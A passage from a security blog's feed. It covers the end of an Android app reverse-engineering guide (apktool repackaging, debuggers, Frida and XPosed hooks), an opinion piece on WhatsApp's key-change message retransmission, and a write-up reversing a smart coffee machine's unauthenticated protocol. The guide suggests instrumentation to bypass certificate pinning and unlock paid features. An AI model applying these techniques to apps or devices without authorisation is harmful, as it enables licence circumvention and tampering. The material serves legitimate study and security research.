<p><img src="/images/2017/04/joe.jpg" alt="Joe Sandbox"></p>
<h4 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h4><p>If sandboxing is not enough and you need to get deeper insights of the application behaviour, you’ll need to debug it. Debugging an app, in case you don’t know, means attaching to the running process with a <code>debugger</code> software, putting <code>breakpoints</code> that will allow you to stop the execution and inspect the memory state and <code>step</code> into code lines one by one in order to follow the execution graph very closely.</p>
<h5 id="Enabling-Debug-Mode"><a href="#Enabling-Debug-Mode" class="headerlink" title="Enabling Debug Mode"></a>Enabling Debug Mode</h5><p>When an application is compiled and eventually published to the Google Play Store, it’s usually its <code>release</code> build you’re looking at, meaning debugging has been disabled by the developer and you can’t attach to it directly. In order to enable debugging again, we’ll need to use <code>apktool</code> to decompile the app:</p>
<pre><code>apktool d application.apk
</code></pre><p>Then you’ll need to edit the <code>AndroidManifest.xml</code> generated file, adding the <code>android:debuggable=&quot;true&quot;</code> attribute to its <code>application</code> XML node:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.company.appname"</span> </span></div><div class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionCode</span>=<span class="string">"24"</span> </span></div><div class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionName</span>=<span class="string">"7.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> </span></div><div class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> </span></div><div class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> </span></div><div class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:debuggable</span>=<span class="string">"true"</span>&gt;</span> <span class="tag">&lt;<span class="name">--</span> !!! <span class="attr">NOTICE</span> <span class="attr">ME</span> !!! <span class="attr">--</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.company.appname.MainActivity"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></div><div class="line">    </div><div class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Once you updated the manifest, let’s rebuild the app:</p>
<pre><code>apktool b -d application_path output.apk
</code></pre><p>Now let’s resign it:</p>
<pre><code>git clone https://github.com/appium/sign
java -jar sign/dist/signapk.jar sign/testkey.x509.pem sign/testkey.pk8 output.apk signed.apk
</code></pre><p>And reinstall it on the device (make sure you unistalled the original version first):</p>
<pre><code>adb install signed.apk
</code></pre><p>Now you can proceed debugging the app ^_^</p>
<h5 id="Android-Studio"><a href="#Android-Studio" class="headerlink" title="Android Studio"></a>Android Studio</h5><p><a href="https://developer.android.com/studio/debug/index.html" target="_blank" rel="external">Android Studio</a> is the official Android IDE, once you have debug mode enabled for your app, you can directly attach to it using this IDE and start debugging:</p>
<p><img src="/images/2017/04/androidstudio.png" alt="Android Studio Debugger"></p>
<h5 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h5><p>If you have an IDA license that supports Dalvik debugging, you can attach to a running process and step trough the smali code, <a href="https://www.hex-rays.com/products/ida/support/tutorials/debugging_dalvik.pdf" target="_blank" rel="external">this document</a> describes how to do it, but basically the idea is that you upload the ARM debugging server ( a native ARM binary ) on your device, you start it using <code>adb</code> and eventually you start your debugging session from IDA.</p>
<p><img src="/images/2017/04/idadbg.gif" alt="IDA Dalvik Debugger"></p>
<h4 id="Dynamic-Instrumentation"><a href="#Dynamic-Instrumentation" class="headerlink" title="Dynamic Instrumentation"></a>Dynamic Instrumentation</h4><p>Dynamic instrumentation means that you want to modify the application behaviour at runtime and in order to do so you inject some “agent” into the app that you’ll eventually use to instrument it.</p>
<p>You might want to do this in order to make the app bypass some checks ( for instance, if public key pinning is enforced, you might want to disable it with dynamic instrumentation in order to easily inspect the HTTPS traffic ), make it show you information it’s not supposed to show ( unlock “Pro” features, or debug/admin activities ), etc.</p>
<h5 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h5><p><a href="https://www.frida.re/" target="_blank" rel="external">Frida</a> is a great and free tool you can use to inject a whole Javascript engine into a running process on Android, iOS and many other platforms … but why Javascript?</p>
<p>Because once the engine is injected, you can instrument the app in very cool and easy ways like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="comment"># let's attach to the 'hello process</span></div><div class="line">session = frida.attach(<span class="string">"hello"</span>)</div><div class="line"></div><div class="line"><span class="comment"># now let's create the Javascript we want to inject</span></div><div class="line">script = session.create_script(<span class="string">"""</span></div><div class="line"><span class="string">Interceptor.attach(ptr("%s"), &#123;</span></div><div class="line"><span class="string">    onEnter: function(args) &#123;</span></div><div class="line"><span class="string">        send(args[0].toInt32());</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string">&#125;);</span></div><div class="line"><span class="string">"""</span> % int(sys.argv[<span class="number">1</span>], <span class="number">16</span>))</div><div class="line"></div><div class="line"><span class="comment"># this function will receive events from the js</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line"><span class="comment"># let's start!</span></div><div class="line">script.on(<span class="string">'message'</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
<p>In this example, we’re just inspecting some function argument, but there’re hundreds of things you can do with Frida, just <a href="https://www.frida.re/docs/home/" target="_blank" rel="external">RTFM!</a> and use your imagination :D</p>
<p><a href="https://github.com/dweinstein/awesome-frida" target="_blank" rel="external">Here</a>‘s a list of cool Frida resources, enjoy!</p>
<h5 id="XPosed"><a href="#XPosed" class="headerlink" title="XPosed"></a>XPosed</h5><p>Another option we have for instrumenting our app is using the <a href="http://repo.xposed.info/" target="_blank" rel="external">XPosed Framework</a>. XPosed is basically an instrumentation layer for the whole Dalvik VM which <a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="external">requires</a> you to to have a rooted phone in order to install it.</p>
<p>From XPosed <a href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial" target="_blank" rel="external">wiki</a>:</p>
<pre><code>There is a process that is called &quot;Zygote&quot;. This is the heart of the Android runtime. Every application is started as a copy (&quot;fork&quot;) of it. This process is started by an /init.rc script when the phone is booted. The process start is done with /system/bin/app_process, which loads the needed classes and invokes the initialization methods.

This is where Xposed comes into play. When you install the framework, an extended app_process executable is copied to /system/bin. This extended startup process adds an additional jar to the classpath and calls methods from there at certain places. For instance, just after the VM has been created, even before the main method of Zygote has been called. And inside that method, we are part of Zygote and can act in its context.

The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar and its source code can be found here. Looking at the class XposedBridge, you can see the main method. This is what I wrote about above, this gets called in the very beginning of the process. Some initializations are done there and also the modules are loaded (I will come back to module loading later).
</code></pre><p>Once you’ve installed XPosed on your smartphone, you can start developing your own module (again, follow the <a href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial" target="_blank" rel="external">project wiki</a>), for instance, here’s an example of how you would hook the <code>updateClock</code> method of the SystemUI application in order to instrument it:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> de.robv.android.xposed.mods.tutorial;</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tutorial</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.android.systemui"</span>))</div><div class="line">            <span class="keyword">return</span>;</div><div class="line"></div><div class="line">        findAndHookMethod(<span class="string">"com.android.systemui.statusbar.policy.Clock"</span>, lpparam.classLoader, <span class="string">"updateClock"</span>, </div><div class="line">            <span class="keyword">new</span> XC_MethodHook() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">                <span class="comment">// this will be called before the clock was updated by the original method</span></div><div class="line">            &#125;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">                <span class="comment">// this will be called after the clock was updated by the original method</span></div><div class="line">            &#125;</div><div class="line">    &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>There’re already a lot of <a href="http://repo.xposed.info/module-overview" target="_blank" rel="external">user contributed modules</a> you can use, study and modify for your own needs.</p>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>I hope you’ll find this reference guide useful for your Android reversing adventures, keep in mind that the most important thing while reversing is not the tool you’re using, but how you use it, so you’ll have to learn how to choose the appropriate tool for your scenario and this is something you can only learn with experience, so enough reading and start reversing! :D</p>
<div style="position:relative;height:0;padding-bottom:56.25%"><iframe src="https://www.youtube.com/embed/I1188GO4p1E?ecver=2" width="640" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen></iframe></div>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Every day we see a bunch of new Android applications being published on the Google Play Store, from games, to utilities, to IoT devices clients and so forth, almost every single aspect of our life can be somehow controlled with “an app”. We have smart houses, &lt;a href=&quot;https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/&quot;&gt;smart fitness devices&lt;/a&gt; and &lt;a href=&quot;https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/&quot;&gt;smart coffee machines&lt;/a&gt; … but is this stuff just smart or is it &lt;strong&gt;secure&lt;/strong&gt; as well? :)&lt;/p&gt;
&lt;p&gt;Reversing an Android application can be a (relatively) easy and fun way to answer this question, that’s why I decided to write this blog post where I’ll try to explain the basics and give you some of my “tricks” to reverse this stuff faster and more effectively.&lt;/p&gt;
&lt;p&gt;I’m not going to go very deep into technical details, you can learn yourself how Android works, how the Dalvik VM works and so forth, this is gonna be a &lt;strong&gt;very basic practical guide&lt;/strong&gt; instead of a post full of theoretical stuff but no really useful contents.&lt;/p&gt;
&lt;p&gt;Let’s start! :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/04/head.jpeg&quot; alt=&quot;start&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
    
      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
    
      <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
    
      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
    
      <category term="dex" scheme="https://www.evilsocket.net/tags/dex/"/>
    
      <category term="re" scheme="https://www.evilsocket.net/tags/re/"/>
    
      <category term="IDA" scheme="https://www.evilsocket.net/tags/IDA/"/>
    
      <category term="Hopper" scheme="https://www.evilsocket.net/tags/Hopper/"/>
    
      <category term="JADX" scheme="https://www.evilsocket.net/tags/JADX/"/>
    
      <category term="apktool" scheme="https://www.evilsocket.net/tags/apktool/"/>
    
      <category term="JD-GUI" scheme="https://www.evilsocket.net/tags/JD-GUI/"/>
    
      <category term="Dex2Jar" scheme="https://www.evilsocket.net/tags/Dex2Jar/"/>
    
      <category term="Frida" scheme="https://www.evilsocket.net/tags/Frida/"/>
    
      <category term="XPosed" scheme="https://www.evilsocket.net/tags/XPosed/"/>
    
      <category term="XPosed Framework" scheme="https://www.evilsocket.net/tags/XPosed-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Thoughts on WhatsApp E2E Encryption AKA Security Is Real Only if It&#39;s the Default.</title>
    <link href="https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/"/>
    <id>https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/</id>
    <published>2017-01-14T19:10:02.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>Yesterday <a href="https://twitter.com/tobiasboelter" target="_blank" rel="external">Tobias Boelter</a> posted on his blog <a href="https://tobi.rocks/2017/01/whatsapp-vulnerability-bug-or-backdoor/" target="_blank" rel="external">this article</a> which essentially highlights a message rentransmission vulnerability on WhatsApp which makes it leak sensitive information if the recipient’s key changed, only alerting the user <strong>after</strong> the message has been sent.<br>The Guardian has then picked up the info and posted the article “<a href="https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages" target="_blank" rel="external">WhatsApp vulnerability allows snooping on encrypted messages</a>“. </p>
<p>In a matter of hours, a shit load of experts (and unfortunately also lot of ppl who are <strong>not</strong> experts at all) pointed their fingers at The Guardian, arguing that it’s not a backdoor and all other kind of sterile polemics. At some point, Moxie from Open Whisper Systems, the noprofit organization who made <strong>Signal</strong>, the only really secure messaging app we’re aware of <strong>and</strong> the library that WhatsApp recently integrated in order to give E2E encrypted messaging to all of their users, published on the blog this: “<a href="https://whispersystems.org/blog/there-is-no-whatsapp-backdoor/" target="_blank" rel="external">There is no WhatsApp ‘backdoor’</a>“, which <strong>seemed</strong> to have put the word END to this conversation.</p>
<p>I do not agree and, since a lot of <strong>ego</strong> is going on here, I’d like to share my thoughts as well.</p>
<a id="more"></a>
<center><br><blockquote class="twitter-tweet" data-lang="it"><p lang="en" dir="ltr">.<a href="https://twitter.com/guardian" target="_blank" rel="external">@guardian</a> Pathetically, everyone who jumped to trumpet my tweets of a Telegram weakness will ignore this because WhatsApp staff stroked the right egos</p>&mdash; Nadim Kobeissi (@kaepora) <a href="https://twitter.com/kaepora/status/819893937934434304" target="_blank" rel="external">13 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>First thing first, following the <strong>PoC||GTFO</strong> sacrosanct principle, let’s take a look at the video that Tobias recently uploaded.</p>
<center><br>    <iframe width="100%" height="315" src="https://www.youtube.com/embed/we-pJE5JjAs" frameborder="0" allowfullscreen></iframe><br></center>

<p>In the video Tobias just swapped the SIM card to the other phone to prove his point, but it’s quite clear that from a state sponsored attacker perspective, physical access to the sim card or the victim’s phone is not needed at all, there are plenty of easier ways for them to do that ( pretty much like <a href="https://lists.cpunks.org/pipermail/cypherpunks/2016-April/012958.html" target="_blank" rel="external">Russia did with SS7 &amp; Telegram users</a> ).</p>
<p>Long story short, if WhatsApp technicians manage to replace your recipient E2E encryption key on the server side and impersonate him (or manage to clone his sim on the TELCO side), <strong>your sensitive message will be sent anyway</strong>, the client will show you just a warning about the key change, but nevertheless, let’s say it again, <strong>your sensitive message will be sent anyway</strong> … and they’ll be able to read it, <strong>period</strong>.</p>
<center><br>    <img width="250" src="https://whispersystems.org/blog/images/whatsapp-keychange.png"><br></center>

<p>On the other hand, <a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms" target="_blank" rel="external">Signal</a> prevents this from happening, once it’ll detect the key being changed, it will <strong>block</strong> the conversation and warn the user about it, it’ll be the user then to decide if trusting the new key or not, regardless, <strong>the sensitive contents won’t be rentransmitted without the user allowing it</strong>, this is a subtle but very important detail.</p>
<h3 id="But-it’s-just-a-matter-of-settings"><a href="#But-it’s-just-a-matter-of-settings" class="headerlink" title="But it’s just a matter of settings!"></a>But it’s just a matter of settings!</h3><center><br><blockquote class="twitter-tweet" data-lang="it"><p lang="en" dir="ltr">quoting mr <a href="https://twitter.com/csoghoian" target="_blank" rel="external">@csoghoian</a>, this sentence quite fits in this whole WhatsApp / Guardian / <a href="https://twitter.com/whispersystems" target="_blank" rel="external">@whispersystems</a> discussion <a href="https://t.co/DHEnmYqRrw" target="_blank" rel="external">pic.twitter.com/DHEnmYqRrw</a></p>&mdash; Simone Margaritelli (@evilsocket) <a href="https://twitter.com/evilsocket/status/820100621898547201" target="_blank" rel="external">14 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>Yes, they <strong>do</strong> implement the same protocol and <strong>no</strong>, we don’t have any real evidence that Facebook messed with it, <strong>still</strong> they created (either intentionally or not) a very serious security vulnerability for their users.</p>
<p>And it’s exactly about <strong>intentionality</strong> we’re talking about, if it was intentionally implelemented to spy on users <strong>it’s a backdoor</strong>, otherwise <strong>it’s not a backdoor</strong> … but <strong>we don’t know</strong>, we never will and honestly it’s just a stupid and pointless waste of time discussing about it further.</p>
<h3 id="Usability-Really"><a href="#Usability-Really" class="headerlink" title="Usability? Really?"></a>Usability? Really?</h3><p>But the point is, <strong>why implementing e2e encryption in the first place if when keys do not match what expected, the client transmits the message anyway?</strong> Usability? <strong>The usability of what</strong>? Because E2E encryption is <strong>not</strong> usable that way, the client itself might be, but definitely not the underlying protocol which should guarantee the users privacy <strong>on top of everything else</strong>.</p>
<p>Moreover, do you really expect the average whatsapp user to understand what that yellow baloon means if you don’t clearly block the conversation and warn him about what happened? Is this usability? COME ON!</p>
<p>I think Moxie just missed the point, which is <strong>not</strong> they key being changed, but the client retransmitting the message regardless!<br>I used to respect him for his life-long battle for privacy, but reading his post it’s quite clear how his opinion is biased towards Facebook.</p>
<center><br><blockquote class="twitter-tweet" data-conversation="none" data-lang="it"><p lang="en" dir="ltr">.<a href="https://twitter.com/guardian" target="_blank" rel="external">@guardian</a> Whisper Systems comes to Facebook/WhatsApp&#39;s defense on its own blog honestly not understanding the problem. Wow. <a href="https://t.co/6EZ0K9Xcle" target="_blank" rel="external">https://t.co/6EZ0K9Xcle</a></p>&mdash; Nadim Kobeissi (@kaepora) <a href="https://twitter.com/kaepora/status/820028708803088385" target="_blank" rel="external">13 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>I’m not a cryptographer of a crypto expert of any kind, but I’ve spent quite a few years working on MITM attacks and tools, I’m well aware how easy it is for <strong>anyone</strong> to exploit the information you leak on a network, and I’m well aware that state sponsored attackers have trillions of other ways to do that more easily and transparently (for the user of course) … we should just stop the drama about it being a backdoor or not and focus on what really matters:</p>
<p><strong>It is definitely a serious security issue for the users privacy and Facebook refused to fix it</strong>.</p>
<p>There’s really nothing more than that to say.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yesterday &lt;a href=&quot;https://twitter.com/tobiasboelter&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Tobias Boelter&lt;/a&gt; posted on his blog &lt;a href=&quot;https://tobi.rocks/2017/01/whatsapp-vulnerability-bug-or-backdoor/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;this article&lt;/a&gt; which essentially highlights a message rentransmission vulnerability on WhatsApp which makes it leak sensitive information if the recipient’s key changed, only alerting the user &lt;strong&gt;after&lt;/strong&gt; the message has been sent.&lt;br&gt;The Guardian has then picked up the info and posted the article “&lt;a href=&quot;https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WhatsApp vulnerability allows snooping on encrypted messages&lt;/a&gt;“. &lt;/p&gt;
&lt;p&gt;In a matter of hours, a shit load of experts (and unfortunately also lot of ppl who are &lt;strong&gt;not&lt;/strong&gt; experts at all) pointed their fingers at The Guardian, arguing that it’s not a backdoor and all other kind of sterile polemics. At some point, Moxie from Open Whisper Systems, the noprofit organization who made &lt;strong&gt;Signal&lt;/strong&gt;, the only really secure messaging app we’re aware of &lt;strong&gt;and&lt;/strong&gt; the library that WhatsApp recently integrated in order to give E2E encrypted messaging to all of their users, published on the blog this: “&lt;a href=&quot;https://whispersystems.org/blog/there-is-no-whatsapp-backdoor/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;There is no WhatsApp ‘backdoor’&lt;/a&gt;“, which &lt;strong&gt;seemed&lt;/strong&gt; to have put the word END to this conversation.&lt;/p&gt;
&lt;p&gt;I do not agree and, since a lot of &lt;strong&gt;ego&lt;/strong&gt; is going on here, I’d like to share my thoughts as well.&lt;/p&gt;
    
    </summary>
    
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
      <category term="whatsapp" scheme="https://www.evilsocket.net/tags/whatsapp/"/>
    
      <category term="end to end encryption" scheme="https://www.evilsocket.net/tags/end-to-end-encryption/"/>
    
      <category term="the guardian" scheme="https://www.evilsocket.net/tags/the-guardian/"/>
    
      <category term="backdoor" scheme="https://www.evilsocket.net/tags/backdoor/"/>
    
  </entry>
  
  <entry>
    <title>Reversing the Smarter Coffee IoT Machine Protocol to Make Coffee Using the Terminal.</title>
    <link href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/"/>
    <id>https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/</id>
    <published>2016-10-09T13:09:11.000Z</published>
    <updated>2017-08-11T14:28:47.035Z</updated>
    
    <content type="html"><![CDATA[<p>I love coffee, that’s a fact, and I drink liters of it during the week … I also am a nerd and a hacker, so a few days ago I bought a <a href="http://smarter.am/coffee/" target="_blank" rel="external">Smarter Coffee</a> machine on Amazon, basically a coffee machine that you can control over your home wifi network using a mobile application ( both for Android and iOS ).<br>The app is really nice: you can set the amount of cups you want, the strength of the coffee, etc, then you only need to press a button and wait for your delicious coffee to be brewed.</p>
<p>Since I work from home, most of the times I’m using the computer keyboard, not a smartphone, therefore I wanted/needed a console client for it, something that the vendor never released, so I started reversing the Android application in order to understand the communication protocol and write my own client implementation … guess what? :D</p>
<p>Yep, i can make coffee using the terminal now :D</p>
<center><br><img src="/images/2016/10/terminal.png" alt="terminal"><br></center>

<a id="more"></a>
<h3 id="Reversing-the-Protocol"><a href="#Reversing-the-Protocol" class="headerlink" title="Reversing the Protocol"></a>Reversing the Protocol</h3><p>I decided to reverse the <a href="https://play.google.com/store/apps/details?id=am.smarter.smarterandroid" target="_blank" rel="external">Android application</a> since it’s usualy way easier than reversing iOS ones ( java vs assembly :D ), once I downloaded the APK I started studying the various classes and methods.</p>
<p>So I fired up <a href="https://github.com/skylot/jadx" target="_blank" rel="external">JADX</a> ( with the <code>--show-bad-code</code> argument ), I launched CTAGS inside the exported source code folder and VIM to navigate it.<br>A few hours later, I found the interesting part in the <code>am.smarter.smarterandroid.models.a</code> class and noticed a few methods like the following:</p>
<center><br><img src="/images/2016/10/methods.png" alt="methods"><br></center>

<p>Each of these “packets” is sent to tcp port <code>2081</code> of the machine, the protocol is <strong>very</strong> simple.</p>
<ul>
<li>First byte: the command number.</li>
<li>Second byte to N: optional data ( depending on the command code ).</li>
<li>Last byte: always <code>0x7e</code> which indicates the end of the packet.</li>
</ul>
<p>Responses can vary, but for most of the commands they are:</p>
<ul>
<li>First byte: response size</li>
<li>Second byte: status ( 0 = success otherwise error code )</li>
<li>Last byte: always <code>0x7e</code>.</li>
</ul>
<p>An example command and response, the one to keep the coffee warm for 5 minutes for instance, would be:</p>
<p>COMMAND  : <code>0x3e 0x05 0x7e</code><br>RESPONSE : <code>0x03 0x00 0x7e</code></p>
<p>So I’ve mapped all the commands I needed in order to write a minimal console client and tested it … this is the result, it works like a charm! :D</p>
<center><br><iframe width="100%" height="400" src="https://www.youtube.com/embed/9PeR9d18E14" frameborder="0" allowfullscreen></iframe><br></center>

<p>You can <a href="https://github.com/evilsocket/coffee" target="_blank" rel="external">download the client code here</a>, you’ll need to specify the machine ip address the first time, then it will be saved in the <code>~/.smartercoffee</code> file and won’t be needed anymore.</p>
<pre><code>coffee make -A 192.168.1.50
</code></pre><p><strong>A few examples:</strong></p>
<p>Just make one cup of coffee:</p>
<pre><code>coffee make
</code></pre><p>Make two cups using the filter instead of the beans in the grinder:</p>
<pre><code>coffee make --filter
</code></pre><p>Keep coffee warm for ten minutes:</p>
<pre><code>coffee warm --keep-warm=10
</code></pre><p><strong>Full usage</strong></p>
<pre><code>☕ ☕ ☕  SmarterCoffee Client ☕ ☕ ☕
by Simone &apos;evilsocket&apos; Margaritelli

Usage: coffee [options] (make|warm)

Options:
  -h, --help            show this help message and exit
  -A ADDRESS, --address=ADDRESS
                        IP address of the Smarter coffee machine.
  -M, --make            Make coffee.
  -W, --warm            Warm coffee.
  -C CUPS, --cups=CUPS  Set number of cups.
  -S STRENGTH, --strength=STRENGTH
                        Set coffee strength ( 0-2 ).
  -G, --grind           Use grind.
  -F, --filter          Use filter.
  -K TIME, --keep-warm=TIME
                        Keep the coffee warm for TIME minutes.
</code></pre><h3 id="Security-Considerations"><a href="#Security-Considerations" class="headerlink" title="Security Considerations"></a>Security Considerations</h3><p>Even if the mobile app requires you to register an account, <strong>access to port 2081 is completely unauthenticated</strong> ( in fact, I’ve found that the user account is only used for statistics using the Firebase API ), anyone on your network could access it and <strong>even flash a new firmware</strong> with no authentication required ( I reversed the <code>UPDATE_FIRMWARE</code> packet as well but you won’t find it on the repo :P )</p>
<center><br><img src="/images/2016/10/firmware.jpg" alt="flashing the firmware"><br></center>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I love coffee, that’s a fact, and I drink liters of it during the week … I also am a nerd and a hacker, so a few days ago I bought a &lt;a href=&quot;http://smarter.am/coffee/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Smarter Coffee&lt;/a&gt; machine on Amazon, basically a coffee machine that you can control over your home wifi network using a mobile application ( both for Android and iOS ).&lt;br&gt;The app is really nice: you can set the amount of cups you want, the strength of the coffee, etc, then you only need to press a button and wait for your delicious coffee to be brewed.&lt;/p&gt;
